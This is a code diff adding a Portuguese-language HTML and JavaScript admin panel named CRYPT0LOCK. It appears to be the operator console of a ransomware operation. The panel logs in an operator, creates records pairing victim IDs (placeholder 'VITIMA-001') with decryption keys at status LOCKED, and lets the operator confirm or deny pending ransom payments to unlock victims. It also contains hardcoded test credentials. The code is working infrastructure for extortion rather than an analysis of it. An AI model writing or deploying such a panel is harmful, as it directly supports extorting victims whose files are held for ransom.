@@ -1,0 +1,872 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+<meta charset="UTF-8">
+<title>PAINEL ADMIN - CRYPT0LOCK</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=VT323&family=JetBrains+Mono:wght@400;700&display=swap');
+
+:root{
+  --bg: #060a08;
+  --green: #39ff6a;
+  --green-dim: #1a7a3a;
+  --amber: #ffb000;
+  --red: #ff2a4d;
+  --grey: #5d7a68;
+  --white: #d9ffe6;
+}
+
+*{box-sizing:border-box; margin:0; padding:0;}
+
+body{
+  background: var(--bg);
+  color: var(--green);
+  font-family: 'JetBrains Mono', monospace;
+  min-height:100vh;
+  overflow-x:hidden;
+}
+
+.crt::before{
+  content:"";
+  position:fixed; top:0; left:0; width:100%; height:100%;
+  background: repeating-linear-gradient(
+    to bottom,
+    rgba(0,0,0,0) 0px,
+    rgba(0,0,0,0) 2px,
+    rgba(0,255,100,0.025) 3px,
+    rgba(0,0,0,0) 4px
+  );
+  pointer-events:none;
+  z-index:998;
+}
+
+.container{
+  max-width:1400px;
+  margin:0 auto;
+  padding:30px 20px;
+  position:relative;
+  z-index:10;
+}
+
+.header{
+  text-align:center;
+  margin-bottom:40px;
+  padding-bottom:20px;
+  border-bottom:1px solid var(--green-dim);
+}
+
+.header h1{
+  font-family:'VT323';
+  font-size:36px;
+  letter-spacing:2px;
+  margin-bottom:8px;
+  text-shadow: 0 0 10px rgba(57,255,106,0.6);
+}
+
+.header p{
+  font-size:12px;
+  color:var(--grey);
+  letter-spacing:1px;
+}
+
+.login-panel{
+  max-width:400px;
+  margin:100px auto;
+  background: linear-gradient(180deg, rgba(10,20,14,0.92), rgba(4,8,6,0.96));
+  border:1px solid var(--green-dim);
+  padding:30px;
+  border-radius:4px;
+}
+
+.field-label{
+  font-size:12px;
+  color:var(--white);
+  letter-spacing:1px;
+  margin-bottom:6px;
+  display:block;
+}
+
+.field-row{
+  margin-bottom:16px;
+}
+
+input[type=text],
+input[type=password]{
+  width:100%;
+  background:#020503;
+  border:1px solid var(--green-dim);
+  color:var(--green);
+  font-family:'JetBrains Mono', monospace;
+  font-size:13px;
+  padding:10px 12px;
+  outline:none;
+  letter-spacing:1px;
+  box-sizing:border-box;
+}
+
+input:focus{
+  border-color:var(--green);
+  box-shadow:0 0 10px rgba(57,255,106,0.3);
+}
+
+button{
+  background:transparent;
+  border:1px solid var(--green);
+  color:var(--green);
+  font-family:'Share Tech Mono', monospace;
+  letter-spacing:1px;
+  font-size:12px;
+  padding:10px;
+  cursor:pointer;
+  transition: all .15s;
+  margin-top:0;
+}
+
+button:hover:not(:disabled){
+  background:var(--green);
+  color:#04140a;
+  box-shadow:0 0 18px rgba(57,255,106,0.6);
+}
+
+button:disabled{
+  opacity:0.5;
+  cursor:not-allowed;
+}
+
+.msg{
+  margin-top:12px;
+  font-size:12px;
+  min-height:16px;
+}
+
+.msg.error{ color:var(--red); }
+.msg.ok{ color:var(--green); }
+.msg.info{ color:var(--amber); }
+
+.main-panel{
+  background: linear-gradient(180deg, rgba(10,20,14,0.92), rgba(4,8,6,0.96));
+  border:1px solid var(--green-dim);
+  border-radius:4px;
+  overflow:hidden;
+}
+
+.tabs{
+  display:flex;
+  border-bottom:1px solid var(--green-dim);
+  background:#0a1410;
+}
+
+.tab-btn{
+  flex:1;
+  background:transparent;
+  border:none;
+  border-bottom:2px solid transparent;
+  color:var(--grey);
+  font-family:'Share Tech Mono', monospace;
+  font-size:12px;
+  padding:12px;
+  cursor:pointer;
+  margin:0;
+  transition: all .15s;
+}
+
+.tab-btn.active{
+  color:var(--green);
+  border-bottom-color:var(--green);
+}
+
+.tab-btn:hover{
+  color:var(--green);
+  background:rgba(57,255,106,0.1);
+}
+
+.tab-content{
+  display:none;
+  padding:20px;
+  min-height:500px;
+}
+
+.tab-content.active{
+  display:block;
+}
+
+.panel-header{
+  background:#0a1410;
+  border-bottom:1px solid var(--green-dim);
+  padding:12px 20px;
+  display:flex;
+  justify-content:space-between;
+  align-items:center;
+}
+
+.panel-header h2{
+  font-size:14px;
+  letter-spacing:1px;
+  font-weight:normal;
+}
+
+.logout-btn{
+  background:transparent;
+  border:1px solid var(--red);
+  color:var(--red);
+  font-size:11px;
+  padding:4px 10px;
+  cursor:pointer;
+  transition: all .15s;
+  width:auto;
+  margin:0;
+}
+
+.logout-btn:hover{
+  background:var(--red);
+  color:#04140a;
+}
+
+.two-column{
+  display:grid;
+  grid-template-columns:1fr 1fr;
+  gap:20px;
+}
+
+@media(max-width:900px){
+  .two-column{
+    grid-template-columns:1fr;
+  }
+}
+
+.create-form{
+  background:#0a1410;
+  border:1px solid var(--green-dim);
+  padding:20px;
+  border-radius:2px;
+}
+
+.create-form button{
+  width:100%;
+  margin-top:16px;
+}
+
+.registros-list{
+  background:#0a1410;
+  border:1px solid var(--green-dim);
+  padding:20px;
+  border-radius:2px;
+  max-height:600px;
+  overflow-y:auto;
+}
+
+.registros-list h3{
+  font-size:13px;
+  margin-bottom:16px;
+  color:var(--white);
+}
+
+.registro-item{
+  background:#020503;
+  border:1px solid var(--green-dim);
+  padding:12px;
+  margin-bottom:12px;
+  border-radius:2px;
+  font-size:11px;
+}
+
+.registro-item-row{
+  display:flex;
+  justify-content:space-between;
+  margin-bottom:6px;
+  padding-bottom:6px;
+  border-bottom:1px dashed var(--green-dim);
+}
+
+.registro-item-row span:first-child{
+  color:var(--grey);
+}
+
+.registro-item-row span:last-child{
+  color:var(--white);
+  word-break:break-all;
+  text-align:right;
+  max-width:60%;
+}
+
+.registro-item-actions{
+  display:flex;
+  gap:8px;
+  margin-top:8px;
+}
+
+.registro-item-actions button{
+  flex:1;
+  padding:6px 8px;
+  font-size:10px;
+  margin:0;
+}
+
+.btn-delete{
+  border-color:var(--red);
+  color:var(--red);
+}
+
+.btn-delete:hover:not(:disabled){
+  background:var(--red);
+  color:#04140a;
+}
+
+.empty-state{
+  text-align:center;
+  padding:40px 20px;
+  color:var(--grey);
+}
+
+.empty-state p{
+  margin:0;
+  font-size:14px;
+}
+
+.payment-card{
+  background:#0a1410;
+  border:1px solid var(--green-dim);
+  padding:16px;
+  border-radius:2px;
+  margin-bottom:16px;
+}
+
+.payment-card.new{
+  border-color:var(--amber);
+  box-shadow: 0 0 10px rgba(255,176,0,0.2);
+}
+
+.card-header{
+  display:flex;
+  justify-content:space-between;
+  align-items:center;
+  margin-bottom:12px;
+  padding-bottom:12px;
+  border-bottom:1px dashed var(--green-dim);
+}
+
+.card-id{
+  font-size:14px;
+  letter-spacing:1px;
+  font-weight:bold;
+  color:var(--white);
+}
+
+.card-time{
+  font-size:11px;
+  color:var(--grey);
+}
+
+.card-body{
+  margin-bottom:12px;
+  display:grid;
+  gap:6px;
+  font-size:12px;
+}
+
+.card-info{
+  display:flex;
+  justify-content:space-between;
+  padding:6px 0;
+  border-bottom:1px dashed rgba(57,255,106,0.15);
+}
+
+.card-info span:first-child{
+  color:var(--grey);
+}
+
+.card-info span:last-child{
+  color:var(--white);
+}
+
+.card-actions{
+  display:flex;
+  gap:10px;
+}
+
+.card-actions button{
+  flex:1;
+  margin:0;
+  padding:8px 12px;
+  font-size:11px;
+}
+
+.btn-confirm{
+  border-color:var(--green);
+  color:var(--green);
+}
+
+.btn-confirm:hover:not(:disabled){
+  background:var(--green);
+  color:#04140a;
+}
+
+.btn-deny{
+  border-color:var(--red);
+  color:var(--red);
+}
+
+.btn-deny:hover:not(:disabled){
+  background:var(--red);
+  color:#04140a;
+}
+
+.note{
+  font-size:10px;
+  color:var(--grey);
+  margin-top:40px;
+  padding-top:20px;
+  border-top:1px dashed var(--green-dim);
+  text-align:center;
+}
+
+.spinner{
+  display:inline-block;
+  width:10px;
+  height:10px;
+  border:2px solid var(--green-dim);
+  border-top-color:var(--green);
+  border-radius:50%;
+  animation: spin 0.6s linear infinite;
+  margin-right:6px;
+}
+@keyframes spin{ to { transform:rotate(360deg); } }
+</style>
+</head>
+<body class="crt">
+
+<div class="container">
+
+  <!-- TELA DE LOGIN -->
+  <div id="login-screen">
+    <div class="header">
+      <h1>CRYPT0LOCK</h1>
+      <p>PAINEL DE ADMINISTRAÇÃO</p>
+    </div>
+
+    <div class="login-panel">
+      <div class="field-label">USUÁRIO:</div>
+      <div class="field-row">
+        <input type="text" id="username" placeholder="admin" autocomplete="off">
+      </div>
+
+      <div class="field-label">SENHA:</div>
+      <div class="field-row">
+        <input type="password" id="password" placeholder="••••••••">
+      </div>
+
+      <button style="width:100%; margin-top:16px;" onclick="adminLogin()" id="loginBtn">ENTRAR</button>
+      <div class="msg" id="loginMsg"></div>
+
+      <div class="note" style="margin-top:20px; border:none;">
+        Credenciais de teste: admin / test123
+      </div>
+    </div>
+  </div>
+
+  <!-- PAINEL PRINCIPAL -->
+  <div id="main-screen" style="display:none;">
+    <div class="header">
+      <h1>CRYPT0LOCK - ADMIN</h1>
+      <p>GERENCIADOR DE REGISTROS</p>
+    </div>
+
+    <div class="main-panel">
+      <div class="panel-header">
+        <h2>PAINEL DE CONTROLE</h2>
+        <button class="logout-btn" onclick="logout()">SAIR</button>
+      </div>
+
+      <div class="tabs">
+        <button class="tab-btn active" onclick="switchTab('registros')">REGISTROS</button>
+        <button class="tab-btn" onclick="switchTab('payments')">PAGAMENTOS</button>
+      </div>
+
+      <!-- TAB 1: REGISTROS (CRIAR + LISTAR) -->
+      <div class="tab-content active" id="registros">
+        <div class="two-column">
+          <!-- COLUNA ESQUERDA: CRIAR REGISTRO -->
+          <div class="create-form">
+            <h3 style="margin-bottom:16px; color:var(--white);">CRIAR NOVO REGISTRO</h3>
+
+            <div class="field-label">ID DO USUÁRIO:</div>
+            <div class="field-row">
+              <input type="text" id="createId" placeholder="EX: VITIMA-001" autocomplete="off">
+            </div>
+
+            <div class="field-label">CHAVE DE DESCRIPTOGRAFIA:</div>
+            <div class="field-row">
+              <input type="text" id="createChave" placeholder="Chave única" autocomplete="off">
+            </div>
+
+            <button onclick="createNewRecord()">CRIAR</button>
+            <div class="msg" id="createMsg"></div>
+
+            <div style="margin-top:20px; font-size:10px; color:var(--grey); line-height:1.6;">
+              <p><b>ℹ️ Info:</b></p>
+              <p>• Status padrão: LOCKED</p>
+              <p>• ID deve ser único</p>
+              <p>• Chave será mostrada ao confirmador</p>
+            </div>
+          </div>
+
+          <!-- COLUNA DIREITA: LISTAR REGISTROS -->
+          <div class="registros-list">
+            <h3>REGISTROS CRIADOS</h3>
+            <div id="registros-container">
+              <div class="empty-state">
+                <div class="spinner"></div>
+                <p>Carregando registros...</p>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- TAB 2: PAGAMENTOS PENDENTES -->
+      <div class="tab-content" id="payments">
+        <div id="pending-container">
+          <div class="empty-state">
+            <div class="spinner"></div>
+            <p>Carregando pagamentos...</p>
+          </div>
+        </div>
+      </div>
+
+    </div>
+
+    <div class="note">
+      Aba REGISTROS: Gerenciar registros criados. | Aba PAGAMENTOS: Confirmar pagamentos pendentes.
+    </div>
+  </div>
+
+</div>
+
+<script>
+const API_BASE = "";
+let adminToken = null;
+
+function showLoginScreen(){
+  document.getElementById("login-screen").style.display = "block";
+  document.getElementById("main-screen").style.display = "none";
+}
+
+function showMainScreen(){
+  document.getElementById("login-screen").style.display = "none";
+  document.getElementById("main-screen").style.display = "block";
+}
+
+function switchTab(tabName){
+  // Hide all tabs
+  const tabs = document.querySelectorAll(".tab-content");
+  tabs.forEach(tab => tab.classList.remove("active"));
+  
+  // Remove active from all buttons
+  const btns = document.querySelectorAll(".tab-btn");
+  btns.forEach(btn => btn.classList.remove("active"));
+  
+  // Show selected tab
+  document.getElementById(tabName).classList.add("active");
+  event.target.classList.add("active");
+  
+  // Reload data
+  if(tabName === "registros"){
+    loadRegistros();
+  } else if(tabName === "payments"){
+    loadPendingPayments();
+  }
+}
+
+async function adminLogin(){
+  const username = document.getElementById("username").value.trim();
+  const password = document.getElementById("password").value.trim();
+  const msg = document.getElementById("loginMsg");
+  const btn = document.getElementById("loginBtn");
+
+  if(!username || !password){
+    msg.className = "msg error";
+    msg.textContent = "Preencha usuário e senha.";
+    return;
+  }
+
+  btn.disabled = true;
+  msg.className = "msg ok";
+  msg.textContent = "Autenticando...";
+
+  try{
+    const resp = await fetch(`${API_BASE}/api/admin/auth`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ username, password })
+    });
+
+    const data = await resp.json();
+
+    if(resp.ok && data.success){
+      adminToken = data.token;
+      msg.className = "msg ok";
+      msg.textContent = "✓ Login realizado!";
+      
+      setTimeout(() => {
+        showMainScreen();
+        loadRegistros();
+        loadPendingPayments();
+      }, 600);
+    } else {
+      msg.className = "msg error";
+      msg.textContent = "✗ Credenciais inválidas.";
+      btn.disabled = false;
+    }
+  }catch(e){
+    msg.className = "msg error";
+    msg.textContent = "Erro ao conectar.";
+    btn.disabled = false;
+    console.error(e);
+  }
+}
+
+async function loadRegistros(){
+  const container = document.getElementById("registros-container");
+
+  try{
+    const resp = await fetch(`${API_BASE}/api/admin/registros`, {
+      headers: { "x-admin-token": adminToken }
+    });
+
+    if(!resp.ok){
+      container.innerHTML = '<div class="empty-state"><p>Erro ao carregar registros.</p></div>';
+      return;
+    }
+
+    const data = await resp.json();
+    const registros = data.registros || [];
+
+    if(registros.length === 0){
+      container.innerHTML = '<div class="empty-state"><p>Nenhum registro criado ainda.</p></div>';
+      return;
+    }
+
+    let html = '';
+    registros.forEach(r => {
+      html += `
+        <div class="registro-item">
+          <div class="registro-item-row">
+            <span>ID:</span>
+            <span>${r.id}</span>
+          </div>
+          <div class="registro-item-row">
+            <span>Chave:</span>
+            <span title="${r.chave}">${r.chave.substring(0, 20)}...</span>
+          </div>
+          <div class="registro-item-row">
+            <span>Status:</span>
+            <span style="color:${r.status === 'locked' ? 'var(--red)' : 'var(--green)'}">${r.status.toUpperCase()}</span>
+          </div>
+          <div class="registro-item-actions">
+            <button class="btn-delete" onclick="deleteRecord('${r.id}')">
+              🗑️ DELETAR
+            </button>
+          </div>
+        </div>
+      `;
+    });
+
+    container.innerHTML = html;
+  }catch(e){
+    container.innerHTML = '<div class="empty-state"><p>Erro ao carregar registros.</p></div>';
+    console.error(e);
+  }
+}
+
+async function loadPendingPayments(){
+  const container = document.getElementById("pending-container");
+
+  try{
+    const resp = await fetch(`${API_BASE}/api/admin/pending`, {
+      headers: { "x-admin-token": adminToken }
+    });
+
+    if(!resp.ok){
+      container.innerHTML = '<div class="empty-state"><p>Erro ao carregar pagamentos.</p></div>';
+      return;
+    }
+
+    const data = await resp.json();
+    const pending = data.pending || [];
+
+    if(pending.length === 0){
+      container.innerHTML = '<div class="empty-state"><p>✓ Nenhum pagamento pendente.</p></div>';
+      return;
+    }
+
+    let html = '';
+    pending.forEach(p => {
+      const tempo = new Date(p.notificado_em).toLocaleString('pt-BR');
+      html += `
+        <div class="payment-card new">
+          <div class="card-header">
+            <div class="card-id">${p.user_id}</div>
+            <div class="card-time">${tempo}</div>
+          </div>
+          <div class="card-body">
+            <div class="card-info">
+              <span>Status:</span>
+              <span>${p.payment_status}</span>
+            </div>
+          </div>
+          <div class="card-actions">
+            <button class="btn-confirm" onclick="confirmPayment('${p.user_id}')">
+              ✓ CONFIRMAR
+            </button>
+            <button class="btn-deny" onclick="denyPayment('${p.user_id}')">
+              ✗ NEGAR
+            </button>
+          </div>
+        </div>
+      `;
+    });
+
+    container.innerHTML = html;
+  }catch(e){
+    container.innerHTML = '<div class="empty-state"><p>Erro ao carregar pagamentos.</p></div>';
+    console.error(e);
+  }
+}
+
+async function createNewRecord(){
+  const id = document.getElementById("createId").value.trim().toUpperCase();
+  const chave = document.getElementById("createChave").value.trim();
+  const msg = document.getElementById("createMsg");
+
+  if(!id || !chave){
+    msg.className = "msg error";
+    msg.textContent = "Preencha ID e chave.";
+    return;
+  }
+
+  msg.className = "msg ok";
+  msg.textContent = "Criando registro...";
+
+  try{
+    const resp = await fetch(`${API_BASE}/api/admin/create`, {
+      method: "POST",
+      headers: { 
+        "x-admin-token": adminToken,
+        "Content-Type": "application/json" 
+      },
+      body: JSON.stringify({ id, chave })
+    });
+
+    const data = await resp.json();
+
+    if(resp.ok){
+      msg.className = "msg ok";
+      msg.textContent = `✓ ${data.message}`;
+      document.getElementById("createId").value = "";
+      document.getElementById("createChave").value = "";
+      
+      setTimeout(() => {
+        msg.textContent = "";
+        loadRegistros();
+      }, 1500);
+    } else {
+      msg.className = "msg error";
+      msg.textContent = `✗ ${data.error || "Erro ao criar"}`;
+    }
+  }catch(e){
+    msg.className = "msg error";
+    msg.textContent = "Erro de conexão.";
+    console.error(e);
+  }
+}
+
+async function deleteRecord(id){
+  if(!confirm(`Deletar registro ${id}? Esta ação é irreversível!`)) return;
+
+  try{
+    const resp = await fetch(`${API_BASE}/api/admin/delete/${id}`, {
+      method: "DELETE",
+      headers: { 
+        "x-admin-token": adminToken,
+        "Content-Type": "application/json" 
+      }
+    });
+
+    const data = await resp.json();
+
+    if(resp.ok){
+      alert(`✓ ${id} foi deletado!`);
+      loadRegistros();
+    } else {
+      alert(`Erro ao deletar: ${data.error}`);
+    }
+  }catch(e){
+    alert("Erro de conexão.");
+    console.error(e);
+  }
+}
+
+async function confirmPayment(userId){
+  if(!confirm(`Confirmar pagamento de ${userId}?`)) return;
+
+  try{
+    const resp = await fetch(`${API_BASE}/api/admin/confirm/${userId}`, {
+      method: "POST",
+      headers: { 
+        "x-admin-token": adminToken,
+        "Content-Type": "application/json" 
+      }
+    });
+
+    if(resp.ok){
+      alert(`✓ ${userId} foi desbloqueado!`);
+      loadPendingPayments();
+      loadRegistros();
+    } else {
+      alert("Erro ao confirmar pagamento.");
+    }
+  }catch(e){
+    alert("Erro de conexão.");
+    console.error(e);
+  }
+}
+
+async function denyPayment(userId){
+  if(!confirm(`Negar pagamento de ${userId}?`)) return;
+
+  try{
+    const resp = await fetch(`${API_BASE}/api/admin/deny/${userId}`, {
+      method: "POST",
+      headers: { 
+        "x-admin-token": adminToken,
+        "Content-Type": "application/json" 
+      }
+    });
+
+    if(resp.ok){
+      alert(`✗ Pagamento de ${userId} foi negado.`);
+      loadPendingPayments();
+    } else {
+      alert("Erro ao negar pagamento.");
+    }
+  }catch(e){
+    alert("Erro de conexão.");
+    console.error(e);
+  }
+}
+
+function logout(){
+  adminToken = null;
+  document.getElementById("username").value = "";
+  document.getElementById("password").value = "";
+  document.getElementById("loginMsg").textContent = "";
+  showLoginScreen();
+}
+
+document.getElementById("password").addEventListener("keydown", e => {
+  if(e.key === "Enter") adminLogin();
+});
+</script>
+</body>
+</html>
